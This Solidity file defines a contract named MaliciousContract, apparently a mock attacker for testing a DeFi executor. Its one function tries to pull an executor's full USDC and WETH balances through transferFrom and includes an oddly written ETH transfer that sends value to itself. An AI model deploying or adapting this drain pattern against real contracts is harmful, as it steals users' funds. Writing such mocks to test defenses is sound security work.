// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousContract {
    address public executor;

    constructor(address _executor) {
        executor = _executor;
    }

    function maliciousCall(
        address tokenA,
        address tokenB
    ) external payable {
        (bool sent, ) = payable(address(this)).call{value: address(executor).balance}("");
        require(sent, "Failed to send Ether");

        // Attempt to drain ERC20 tokens
        IERC20 _tokenA = IERC20(tokenA); // USDC address
        IERC20 _tokenB = IERC20(tokenB); // WETH address

        uint256 _tokenABalance = _tokenA.balanceOf(executor);
        uint256 _tokenBBalance = _tokenB.balanceOf(executor);

        require(_tokenA.transferFrom(executor, address(this), _tokenABalance), "Token A transfer failed");
        require(_tokenB.transferFrom(executor, address(this), _tokenBBalance), "Token B transfer failed");
    }

    receive() external payable {}
}